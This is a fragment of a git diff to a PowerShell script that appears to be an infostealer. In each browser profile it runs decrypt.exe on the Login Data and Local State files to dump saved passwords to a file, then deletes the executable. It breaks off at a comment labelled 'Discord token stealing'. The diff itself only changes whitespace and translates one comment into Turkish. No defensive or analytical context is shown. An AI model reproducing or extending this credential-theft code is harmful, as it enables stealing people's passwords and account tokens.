@@ -68,14 +68,14 @@ foreach ($profile in $profiles) {
         if (Test-Path $loginDataPath -and Test-Path $localStatePath) {
             # Run the decrypt.exe with specified parameters and capture output
             $result = & $decryptExePath $loginDataPath $localStatePath $outputPath 2>&1
-            Write-Host "Decrypt.exe output for $profileName: $($result)"  # Fixed line
-
+            Write-Host "Decrypt.exe output for $profileName: $($result)"  # Hata düzeltildi
+    
             if (Test-Path $outputPath) {
                 Write-Host "$profileName - Decrypted passwords saved to: $outputPath"
             } else {
                 Write-Host "$profileName - Decrypted passwords not found."
             }
-
+    
             # Delete decrypt.exe after use
             try {
                 Remove-Item $decryptExePath -Force -ErrorAction Stop
@@ -89,6 +89,7 @@ foreach ($profile in $profiles) {
     } else {
         Write-Host "$profileName - decrypt.exe not found."
     }
+
 }
 
 # Discord token stealing
